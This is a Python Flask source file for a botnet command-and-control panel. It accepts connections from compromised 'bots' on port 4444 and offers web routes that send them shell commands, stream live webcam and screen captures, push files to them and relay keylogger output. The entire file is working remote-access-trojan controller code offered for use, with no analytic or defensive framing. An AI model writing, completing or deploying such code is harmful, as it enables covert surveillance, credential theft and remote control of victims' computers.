from flask import Flask, render_template, request, redirect, url_for, Response
import socket
import threading
import time

# Flask app setup
app = Flask(__name__)

# Dictionary to store connected bots
bots = {}

# TCP Server setup
TCP_IP = "0.0.0.0"
TCP_PORT = 4444
tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcp_server.bind((TCP_IP, TCP_PORT))
tcp_server.listen(5)

def tcp_listener():
    """Listen for incoming bot connections."""
    while True:
        conn, addr = tcp_server.accept()
        ip = addr[0]
        try:
            os_info = conn.recv(1024).decode()  # Receive OS and location info from bot
            bots[ip] = {'socket': conn, 'os': os_info}
            print(f"[*] New bot connected: {ip}, OS: {os_info}")
            threading.Thread(target=handle_bot, args=(conn, ip)).start()
        except Exception as e:
            print(f"[*] Error accepting bot: {e}")

def handle_bot(conn, ip):
    """Handle communication with a connected bot."""
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            print(f"[{ip}] {data.decode(errors='ignore')}")
    except Exception as e:
        print(f"[*] Bot {ip} disconnected: {e}")
    finally:
        conn.close()
        if ip in bots:
            del bots[ip]

@app.route('/')
def dashboard():
    """Main dashboard listing all bots."""
    return render_template('dashboard.html', bots=bots)

@app.route('/bot/<ip>')
def bot_overview(ip):
    """Bot overview page."""
    if ip in bots:
        bot_info = bots[ip]
        return render_template('bot_overview.html', ip=ip, os=bot_info['os'])
    else:
        return "Bot not found or disconnected.", 404

@app.route('/kill/<ip>')
def kill_bot(ip):
    """Kill bot connection."""
    if ip in bots:
        try:
            bots[ip]['socket'].sendall(b'kill')
            bots[ip]['socket'].close()
        except Exception as e:
            print(f"Error killing bot {ip}: {e}")
        finally:
            del bots[ip]
    return redirect(url_for('dashboard'))

@app.route('/command/<ip>', methods=['POST'])
def send_command(ip):
    """Send shell command to bot."""
    if ip in bots:
        try:
            command = request.form['command']
            bots[ip]['socket'].sendall(command.encode())
            response = bots[ip]['socket'].recv(4096).decode(errors='ignore')
            return response
        except Exception as e:
            return f"Error sending command to bot {ip}: {e}"
    return "Bot not found or disconnected."

@app.route('/webcam/<ip>')
def webcam_stream(ip):
    """Stream live webcam feed from bot."""
    def generate():
        if ip in bots:
            conn = bots[ip]['socket']
            try:
                conn.sendall(b'webcam')  # Command to start webcam
                while True:
                    frame = conn.recv(1024 * 64)  # Receive image data
                    if not frame:
                        break
                    yield (b'--frame\r\n'
                           b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            except Exception as e:
                print(f"[*] Webcam stream stopped for {ip}: {e}")
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/screenshare/<ip>')
def screenshare_stream(ip):
    """Stream live screenshare from bot."""
    def generate():
        if ip in bots:
            conn = bots[ip]['socket']
            try:
                conn.sendall(b'screenshare')  # Command to start screenshare
                while True:
                    frame = conn.recv(1024 * 64)  # Receive image data
                    if not frame:
                        break
                    yield (b'--frame\r\n'
                           b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            except Exception as e:
                print(f"[*] Screenshare stream stopped for {ip}: {e}")
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/upload/<ip>', methods=['POST'])
def upload_file(ip):
    """Upload a file to the bot."""
    if ip in bots:
        try:
            file = request.files['file']
            bots[ip]['socket'].sendall(f'upload|{file.filename}'.encode())
            bots[ip]['socket'].sendall(file.read())
            return "File uploaded successfully."
        except Exception as e:
            return f"Error uploading file to bot {ip}: {e}"
    return "Bot not found or disconnected."

@app.route('/keylogger/<ip>')
def keylogger_stream(ip):
    """Stream live keylogger output."""
    def generate():
        if ip in bots:
            conn = bots[ip]['socket']
            try:
                conn.sendall(b'keylogger')  # Command to start keylogger
                while True:
                    key_data = conn.recv(1024).decode(errors='ignore')
                    yield f"data: {key_data}\n\n"
                    time.sleep(0.1)
            except Exception as e:
                print(f"[*] Keylogger stream stopped for {ip}: {e}")
    return Response(generate(), mimetype='text/event-stream')

# Start TCP Listener in a separate thread
threading.Thread(target=tcp_listener, daemon=True).start()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
